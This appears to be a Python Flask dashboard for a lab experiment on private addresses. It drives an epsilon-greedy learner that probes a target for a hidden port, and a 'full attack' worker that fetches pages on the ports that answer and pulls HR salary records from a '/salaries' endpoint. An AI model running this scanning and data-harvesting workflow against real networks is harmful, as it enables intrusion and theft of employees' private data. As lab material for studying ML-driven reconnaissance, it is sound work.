import json
import os
import subprocess
import sys
import threading
import uuid
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

RESULTS_DIR = Path("/results")
RESULTS_DIR.mkdir(parents=True, exist_ok=True)

TARGET_IP = "192.168.20.10"
ATTACKER_IP = "192.168.10.3"
HIDDEN_PORT = 8081

lock = threading.Lock()
process = None

state = {
    "status": "idle",
    "mode": None,
    "run_id": None,
    "total_steps": 0,
    "epsilon": 0.2,
    "seed": 0,
    "started_at": None,
    "finished_at": None,
    "error": None,
    "result_path": None,
    "log_path": None,
    "attack_path": None
}


def timestamp():
    return datetime.now(timezone.utc).isoformat()


def read_records(path):
    if not path or not Path(path).exists():
        return []

    records = []

    with open(path, "r", encoding="utf-8") as file:
        for line in file:
            try:
                records.append(json.loads(line))
            except (json.JSONDecodeError, ValueError):
                continue

    return records


def read_json(path):
    if not path or not Path(path).exists():
        return None

    try:
        with open(path, "r", encoding="utf-8") as file:
            return json.load(file)
    except (OSError, json.JSONDecodeError):
        return None


def save_json(path, data):
    destination = Path(path)
    temporary = destination.with_suffix(".tmp")

    with open(temporary, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=2, ensure_ascii=False)

    os.replace(temporary, destination)


def get_summary(records):
    replies = sum(1 for row in records if row.get("reply") not in (None, "none", "no_reply", ""))

    hits = [
        row for row in records
        if row.get("template", {}).get("proto") == "tcp"
        and row.get("template", {}).get("src") == "self"
        and row.get("template", {}).get("flags") == "S"
        and str(row.get("template", {}).get("dport")) == str(HIDDEN_PORT)
        and row.get("reply") == "synack"
    ]

    return {
        "completed_steps": len(records),
        "replies_received": replies,
        "no_reply": len(records) - replies,
        "hidden_port_discovered": bool(hits),
        "first_discovery_step": hits[0].get("step") if hits else None,
        "hidden_port_hits": len(hits)
    }


def update_process_status():
    global process

    if process is None or state["status"] != "running":
        return

    return_code = process.poll()

    if return_code is None:
        return

    state["finished_at"] = timestamp()

    if return_code == 0:
        state["status"] = "completed"
    else:
        state["status"] = "failed"
        state["error"] = f"Experiment exited with code {return_code}."

    process = None


def current_status():
    with lock:
        update_process_status()
        snapshot = state.copy()

    records = read_records(snapshot["result_path"])
    summary = get_summary(records)

    total = snapshot["total_steps"]
    completed = summary["completed_steps"]

    progress = min(100.0, completed / total * 100) if total else 0.0

    return {
        "status": snapshot["status"],
        "mode": snapshot["mode"],
        "run_id": snapshot["run_id"],
        "total_steps": total,
        "progress": progress,
        "epsilon": snapshot["epsilon"],
        "seed": snapshot["seed"],
        "started_at": snapshot["started_at"],
        "finished_at": snapshot["finished_at"],
        "error": snapshot["error"],
        **summary
    }


def launch_experiment(mode, steps, epsilon, seed):
    global process

    with lock:
        update_process_status()

        if state["status"] == "running":
            return None

        run_id = uuid.uuid4().hex[:12]

        result_path = str(RESULTS_DIR / f"learning_{run_id}.jsonl")
        log_path = str(RESULTS_DIR / f"learning_{run_id}.log")
        attack_path = str(RESULTS_DIR / f"attack_{run_id}.json")

        if mode == "learning":
            code = (
                "import learner; "
                f"learner.run(steps={steps}, epsilon={epsilon}, "
                f"seed={seed}, out={result_path!r})"
            )

            command = [sys.executable, "-u", "-c", code]

        else:
            command = [
                sys.executable,
                "-u",
                "/lab/interface.py",
                "--full-attack-worker",
                result_path,
                attack_path,
                str(steps),
                str(epsilon),
                str(seed)
            ]

        try:
            with open(log_path, "w", encoding="utf-8") as log:
                new_process = subprocess.Popen(
                    command,
                    cwd="/lab",
                    stdout=log,
                    stderr=subprocess.STDOUT
                )
        except OSError as error:
            return {"error": str(error)}

        process = new_process

        state.update({
            "status": "running",
            "mode": mode,
            "run_id": run_id,
            "total_steps": steps,
            "epsilon": epsilon,
            "seed": seed,
            "started_at": timestamp(),
            "finished_at": None,
            "error": None,
            "result_path": result_path,
            "log_path": log_path,
            "attack_path": attack_path
        })

    return {
        "status": "started",
        "mode": mode,
        "run_id": run_id,
        "steps": steps,
        "epsilon": epsilon,
        "seed": seed
    }


def validate_config(data, full_attack=False):
    try:
        steps = 400 if full_attack else int(data.get("steps", 100))
        epsilon = float(data.get("epsilon", 0.2))
        seed = int(data.get("seed", 0))
    except (ValueError, TypeError):
        return None

    if not 1 <= steps <= 400:
        return None

    if not 0 <= epsilon <= 1:
        return None

    if not 0 <= seed <= 1000000:
        return None

    return steps, epsilon, seed


def http_response(raw):
    if not raw:
        return None, ""

    header, separator, body = raw.partition("\r\n\r\n")

    if not separator:
        return None, ""

    first_line = header.splitlines()[0] if header else ""

    try:
        status_code = int(first_line.split()[1])
    except (IndexError, ValueError):
        status_code = None

    return status_code, body


def run_full_attack_worker(result_path, attack_path, steps, epsilon, seed):
    import learner
    import packeter
    from run_attack import ports_that_answered

    findings = {
        "status": "running",
        "target_ip": TARGET_IP,
        "discovered_ports": [],
        "investigated_ports": [],
        "hr_access_confirmed": False,
        "hr_records": [],
        "access_results": [],
        "finished_at": None
    }

    save_json(attack_path, findings)

    print("[ATTACK] STEP 1: Starting epsilon-greedy learning", flush=True)

    learner.run(
        steps=steps,
        epsilon=epsilon,
        seed=seed,
        out=result_path
    )

    print("[ATTACK] STEP 2: Investigating discovered ports", flush=True)

    doors = ports_that_answered(result_path)
    findings["discovered_ports"] = doors
    save_json(attack_path, findings)

    print(f"[ATTACK] Discovered ports: {doors}", flush=True)

    for port in doors:
        template = {
            "proto": "tcp",
            "flags": "S",
            "dport": port,
            "src": "self",
            "count": 1
        }

        page = packeter.grab(template, "/")

        if not page:
            continue

        findings["investigated_ports"].append(port)

        status_code, body = http_response(page)

        print(
            f"[ATTACK] Port {port}: HTTP {status_code}",
            flush=True
        )

        if status_code != 200 or "/salaries" not in body:
            save_json(attack_path, findings)
            continue

        print(
            f"[ATTACK] Following discovered HR path on port {port}",
            flush=True
        )

        response = packeter.grab(template, "/salaries")
        hr_status, hr_body = http_response(response)

        access = {
            "port": port,
            "path": "/salaries",
            "http_status": hr_status,
            "access_confirmed": False
        }

        if hr_status == 200:
            try:
                parsed = json.loads(hr_body)
            except json.JSONDecodeError:
                parsed = None

            if parsed is not None:
                access["access_confirmed"] = True
                findings["hr_access_confirmed"] = True

                if isinstance(parsed, list):
                    findings["hr_records"] = parsed[:50]
                elif isinstance(parsed, dict):
                    findings["hr_records"] = parsed
                else:
                    findings["hr_records"] = []

                print(
                    f"[ATTACK] Confirmed HR response on port {port}",
                    flush=True
                )

        findings["access_results"].append(access)
        save_json(attack_path, findings)

    findings["status"] = "completed"
    findings["finished_at"] = timestamp()

    save_json(attack_path, findings)

    print("[ATTACK] FULL ATTACK COMPLETED", flush=True)
    print(
        f"[ATTACK] HR access confirmed: {findings['hr_access_confirmed']}",
        flush=True
    )


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/health")
def health():
    return jsonify({
        "status": "online",
        "service": "attacker-interface"
    })


@app.route("/api/status")
def api_status():
    return jsonify(current_status())


@app.route("/api/start", methods=["POST"])
def start_learning():
    data = request.get_json(silent=True) or {}
    config = validate_config(data)

    if config is None:
        return jsonify({"error": "Invalid learning configuration."}), 400

    result = launch_experiment("learning", *config)

    if result is None:
        return jsonify({"error": "An experiment is already running."}), 409

    if "error" in result:
        return jsonify(result), 500

    return jsonify(result), 202


@app.route("/api/full-attack", methods=["POST"])
def start_full_attack():
    data = request.get_json(silent=True) or {}
    config = validate_config(data, full_attack=True)

    if config is None:
        return jsonify({"error": "Invalid attack configuration."}), 400

    result = launch_experiment("full_attack", *config)

    if result is None:
        return jsonify({"error": "An experiment is already running."}), 409

    if "error" in result:
        return jsonify(result), 500

    return jsonify(result), 202


@app.route("/api/results")
def api_results():
    status = current_status()

    with lock:
        result_path = state["result_path"]

    records = read_records(result_path)

    return jsonify({
        "status": status["status"],
        "summary": get_summary(records),
        "records": records  # Return all recorded probes for complete ML analysis
    })


@app.route("/api/logs")
def api_logs():
    with lock:
        log_path = state["log_path"]

    if not log_path or not Path(log_path).exists():
        return jsonify({"logs": []})

    with open(log_path, "r", encoding="utf-8", errors="replace") as file:
        lines = file.readlines()

    return jsonify({"logs": lines[-50:]})


@app.route("/api/attack-results")
def api_attack_results():
    status = current_status()

    with lock:
        mode = state["mode"]
        attack_path = state["attack_path"]

    if mode != "full_attack":
        return jsonify({
            "status": "idle",
            "message": "No full attack experiment selected.",
            "findings": None
        })

    findings = read_json(attack_path)

    return jsonify({
        "status": status["status"],
        "mode": mode,
        "run_id": status["run_id"],
        "findings": findings
    })


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--full-attack-worker":
        _, _, result_path, attack_path, steps, epsilon, seed = sys.argv

        run_full_attack_worker(
            result_path,
            attack_path,
            int(steps),
            float(epsilon),
            int(seed)
        )
    else:
        app.run(host="0.0.0.0", port=5001, debug=False)